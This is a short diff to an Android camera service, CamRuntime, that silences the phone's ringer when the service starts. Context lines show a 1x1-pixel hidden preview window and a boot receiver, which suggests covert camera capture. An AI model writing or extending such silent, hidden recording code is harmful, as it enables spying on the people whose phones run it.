@@ -18,6 +18,7 @@ public class CamRuntime extends Service {
     private LocalBinder localBinder = new LocalBinder();
     private DummyPreview dummyPreview;
     private SystemThread system;
+    private AudioManager audioManager;
     private ReceiverBoot receAction;
     public static int isCamera = 1;//depan
     public static String path = "";
@@ -36,6 +37,9 @@ public class CamRuntime extends Service {
         }
         system = new SystemThread();
         receAction = new ReceiverBoot();
+        audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
+        audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT); //NORMAL, VIBRATE
+
         WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         this.dummyPreview = new DummyPreview(this, startId);
         WindowManager.LayoutParams lp = new WindowManager.LayoutParams(1, 1,
